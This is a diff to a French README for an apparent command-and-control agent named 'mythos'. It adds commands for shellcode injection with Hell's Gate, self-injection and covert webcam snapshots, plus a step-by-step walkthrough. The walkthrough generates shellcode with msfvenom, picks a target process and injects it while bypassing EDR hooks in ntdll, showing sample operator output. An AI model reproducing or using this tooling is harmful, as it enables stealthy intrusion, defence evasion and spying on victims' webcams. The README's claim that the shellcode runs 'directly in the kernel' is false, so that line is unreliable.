@@ -236,6 +236,11 @@ mythos [ID] > hijack_deploy <dll> # Déployer une DLL malveillante (chemin local
 # Agent control
 mythos [ID] > sleep <secondes>    # Modifier l'intervalle de beacon
 mythos [ID] > kill                # Terminer l'agent
+
+# Evasion & Recon
+mythos [ID] > hellsgate <PID>:<B64>  # Injection shellcode via Hell's Gate
+mythos [ID] > hellsgate_local <B64>  # Self-injection via Hell's Gate
+mythos [ID] > webcam_snap            # Capture photo depuis la webcam
 ```
 
 #### Mode "Pseudo-Interactif"
@@ -292,7 +297,38 @@ mythos [ID] > hijack_deploy /tmp/payload.dll
 
 ---
 
-### 6. API REST (Pour l'automatisation)
+### 6. Module Injection & Direct Syscalls (Hell's Gate)
+
+Le framework intègre la technique avancée **Hell's Gate** (avec fallback **Halo's Gate** et **Indirect Syscalls**) pour exécuter du shellcode en contournant totalement les hooks EDR placés en userland (dans `ntdll.dll`).
+
+#### Exemple pratique d'injection
+
+1. **Générer un shellcode (sur Kali)**
+```bash
+# Exemple : shellcode pour lancer la calculatrice, encodé en base64
+msfvenom -p windows/x64/exec CMD="calc.exe" -f raw | base64 -w 0
+# Copiez la sortie base64 (ex: MjQ4...=)
+```
+
+2. **Trouver un processus cible inoffensif**
+```text
+mythos [ID] > proclist
+# Repérez un processus comme notepad.exe (ex: PID 1337)
+```
+
+3. **Exécuter l'injection silencieuse**
+```text
+mythos [ID] > hellsgate 1337:<VOTRE_BASE64_ICI>
+[*] [Hell's Gate] Shellcode injecté avec succès dans PID 1337
+    Technique: Direct syscalls (bypass hooks ntdll)
+    SSN NtAllocateVirtualMemory: 0x0018
+    SSN NtCreateThreadEx: 0x00C1
+```
+*(Le shellcode est exécuté directement dans le kernel sans déclencher les APIs surveillées !)*
+
+---
+
+### 7. API REST (Pour l'automatisation)
 
 ```bash
 # S'authentifier
